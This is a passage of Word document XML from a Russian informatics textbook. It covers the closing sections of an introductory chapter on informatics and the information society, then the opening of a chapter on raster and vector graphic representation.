        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Дистанционный доступ к информации**: Удалённая работа, онлайн-образование, телемедицина</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Массовое производство информационных технологий**: Смартфоны у миллиардов людей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Высокий уровень информационной культуры населения**: Умение работать с информацией — базовый навык</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Положительные аспекты информационного общества:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Доступность знаний</w:t>
      </w:r>
      <w:r>
        <w:t>: Википедия, онлайн-курсы, научные публикации в открытом доступе</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Свобода коммуникации</w:t>
      </w:r>
      <w:r>
        <w:t>: Социальные сети, мессенджеры, видеосвязь</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Экономические возможности</w:t>
      </w:r>
      <w:r>
        <w:t>: Удалённая работа, электронная коммерция, стартапы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эффективность управления</w:t>
      </w:r>
      <w:r>
        <w:t>: Электронное правительство, цифровые сервисы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Научный прогресс</w:t>
      </w:r>
      <w:r>
        <w:t>: Моделирование, анализ больших данных, совместная работа учёных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Персонализация услуг</w:t>
      </w:r>
      <w:r>
        <w:t>: Рекомендательные системы, индивидуальный подход</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Вызовы и проблемы информационного общества:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">⚠️ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цифровое неравенство</w:t>
      </w:r>
      <w:r>
        <w:t>: Не все имеют равный доступ к информационным технологиям</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">⚠️ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информационная перегрузка</w:t>
      </w:r>
      <w:r>
        <w:t>: Избыток информации затрудняет поиск нужной</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">⚠️ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы конфиденциальности</w:t>
      </w:r>
      <w:r>
        <w:t>: Сбор персональных данных, слежка</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">⚠️ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кибербезопасность</w:t>
      </w:r>
      <w:r>
        <w:t>: Хакерские атаки, вирусы, кражи данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">⚠️ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дезинформация</w:t>
      </w:r>
      <w:r>
        <w:t>: Фейковые новости, манипуляции общественным мнением</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">⚠️ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зависимость от технологий</w:t>
      </w:r>
      <w:r>
        <w:t>: Психологические проблемы, цифровая детоксикация</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">⚠️ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Безработица из-за автоматизации</w:t>
      </w:r>
      <w:r>
        <w:t>: Роботы и ИИ заменяют людей на некоторых работах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Роль информатики в современном мире</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В XXI веке информатика играет ключевую роль практически во всех сферах деятельности:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Наука</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Моделирование сложных систем (климат, галактики, белки)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обработка экспериментальных данных (Большой адронный коллайдер)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Биоинформатика (расшифровка генома человека)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Медицина</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Компьютерная томография, МРТ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Системы поддержки принятия врачебных решений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Телемедицина, электронные медицинские карты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разработка лекарств с помощью компьютерного моделирования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Образование</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дистанционное обучение, онлайн-курсы (Coursera, edX)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Образовательные платформы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Виртуальные лаборатории</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Экономика и бизнес</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Электронная коммерция (Amazon, Alibaba, российские маркетплейсы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Финтех (онлайн-банкинг, мобильные платежи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Системы управления предприятием (ERP, CRM)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Государственное управление</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Электронное правительство (Госуслуги)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Системы электронного документооборота</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информационные системы учёта и контроля</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Транспорт</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Системы управления движением (светофоры, диспетчеризация)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>GPS-навигация</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Автопилоты, беспилотные автомобили</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Развлечения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Компьютерные игры</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Стриминговые сервисы (Netflix, YouTube)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Виртуальная и дополненная реальность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Связь с другими темами курса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава является вводной и задаёт контекст для всего учебника:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.5** (Меры информации) — там мы подробно изучали количественные аспекты информации (синтаксическая, семантическая, прагматическая меры), которые здесь были упомянуты в контексте определения информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.10** (Свойства информации. Информационные процессы) — в следующей главе мы детально рассмотрим, какими свойствами обладает информация (достоверность, актуальность, полнота и др.) и какие операции с ней можно производить (сбор, хранение, обработка, передача).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 2** (Технические средства) — техническая информатика, архитектура ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 3** (Программные средства) — системное и прикладное ПО</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 5** (Алгоритмизация) — теоретическая информатика, алгоритмы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 7** (Базы данных) — информационные системы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 8** (Сети) — коммуникационные технологии</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 9** (Защита информации) — информационная безопасность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информатика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — фундаментальная естественная наука, изучающая процессы сбора, хранения, преобразования, передачи и использования информации с помощью компьютерных технологий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — сведения об объектах и явлениях окружающего мира, их свойствах и состоянии, которые уменьшают неопределённость знаний об этих объектах и могут быть представлены в форме, пригодной для восприятия, хранения, преобразования и передачи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Данные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — необработанные факты, сигналы, символы, фиксируемые без учёта их смысла.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Знания</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — информация, осмысленная, систематизированная, встроенная в систему представлений о мире.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Теоретическая информатика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — раздел информатики, изучающий фундаментальные концепции и математические основы обработки информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прикладная информатика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — раздел информатики, занимающийся разработкой и применением информационных технологий для решения практических задач.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Техническая информатика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — раздел информатики, изучающий технические средства реализации информационных процессов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информационное общество</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — общество, в котором информация становится важнейшим ресурсом, а большая часть населения занята работой с информацией.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информационная революция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — качественный скачок в технологиях работы с информацией, приводящий к значительным изменениям в обществе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кибернетика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — наука об управлении, связи и переработке информации в различных системах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Энтропия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — мера неопределённости информации (изучалась в главе 1.5).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Тезаурус</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — совокупность знаний получателя информации (изучался в главе 1.5).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы для самопроверки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Дайте определение информатики как науки.** Что является предметом её изучения? Перечислите основные задачи информатики.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Опишите структуру информатики.** В чём различие между теоретической, прикладной и технической информатикой? Приведите примеры задач для каждого раздела.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните различные подходы к определению информации** (философский, кибернетический, семантический, прагматический). Чем они отличаются? Приведите примеры.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**В чём разница между данными, информацией и знаниями?** Приведите примеры превращения данных в информацию, а информации — в знания.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Перечислите четыре информационные революции в истории человечества.** Опишите каждую революцию: что было изобретено и к каким последствиям это привело.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое информационное общество?** Назовите его основные признаки. Какие преимущества и какие проблемы оно создаёт?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните связь информатики с другими науками** (математика, физика, лингвистика, биология). Приведите примеры междисциплинарных областей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Приведите примеры применения информатики** в трёх различных областях (медицина, образование, транспорт, наука и т.д.). Какие конкретные технологии используются?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Резюме главы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы изучили фундаментальные основы информатики:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Информатика как наука**: Определение, предмет, задачи информатики. Связь с другими науками.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Структура информатики**: Теоретическая, прикладная и техническая информатика — их задачи и взаимосвязь.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Понятие информации**: Различные подходы к определению (философский, кибернетический, семантический, прагматический, бытовой).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Данные, информация, знания**: Различия между этими понятиями и их иерархия.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Информационные революции**: Четыре этапа развития информационных технологий и их влияние на общество (письменность, книгопечатание, электрические средства связи, компьютеры).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Информационное общество**: Признаки, преимущества и проблемы современного информационного общества.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Роль информатики**: Применение информатики в науке, медицине, образовании, экономике, государственном управлении и других сферах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь вы должны уметь:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Объяснить, что изучает информатика и почему она важна</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Различать разделы информатики и понимать их взаимосвязь</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дать определение информации с различных точек зрения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проследить эволюцию информационных технологий в истории человечества</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Понимать особенности информационного общества и его вызовы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Видеть применение информатики в различных областях жизни</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава заложила концептуальный фундамент. В следующих главах мы будем детально изучать технические аспекты: как информация представляется, хранится, обрабатывается и передаётся с помощью компьютерных технологий. Особенно важно будет повторить материал главы 1.5 о мерах информации и перейти к главе 1.10, где будут рассмотрены свойства информации и информационные процессы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>_Конец главы_</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.8: Представление графических данных в двоичном коде</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Графическая информация окружает нас повсюду: фотографии, иллюстрации в учебниках, дизайн веб-сайтов, логотипы компаний, медицинские снимки. Понимание того, как компьютер представляет и обрабатывает изображения в двоичном коде, является важной частью курса информатики и необходимо для работы с графическими редакторами, веб-разработки, компьютерного зрения и многих других областей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Данная тема тесно связана с главой 1.2, где мы рассматривали представление данных в памяти ЭВМ, и главой 1.5, где изучали меры информации и расчёты объёмов данных. Знания из этой главы понадобятся при изучении главы 1.12 (сжатие информации), так как графические данные часто требуют значительного объёма памяти и нуждаются в эффективном сжатии.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы изучим два фундаментально разных подхода к представлению графики — растровый и векторный, рассмотрим цветовые модели, научимся рассчитывать объём графических файлов и познакомимся с распространёнными форматами изображений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Два подхода к представлению графики</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Существует два принципиально различных способа представления графических данных в компьютере: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>растровый</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (bitmap) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>векторный</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (vector).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Растровая графика</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Растровая графика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (также называемая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>битовой</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>точечной</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) представляет изображение как прямоугольную сетку цветных точек — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пикселей</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (от англ. *picture element* — элемент изображения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пиксель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — минимальный элемент растрового изображения, обладающий определённым цветом. Каждый пиксель описывается набором битов, определяющих его цвет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Основные характеристики растрового изображения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ширина (W)** — количество пикселей по горизонтали</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Высота (H)** — количество пикселей по вертикали</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Разрешение** — общее количество пикселей (W × H), например 1920×1080</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Глубина цвета** (или **битовая глубина**, color depth) — количество бит на один пиксель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества растровой графики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Фотореалистичность — может точно передавать сложные цветовые переходы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Простота обработки — пиксель независим от других</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Широкая поддержка — все устройства отображения работают с растром</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки растровой графики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>⚠️ Большой объём данных (особенно для высоких разрешений)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>⚠️ Потеря качества при масштабировании (пикселизация)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>⚠️ Зависимость от разрешения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Векторная графика</w:t>
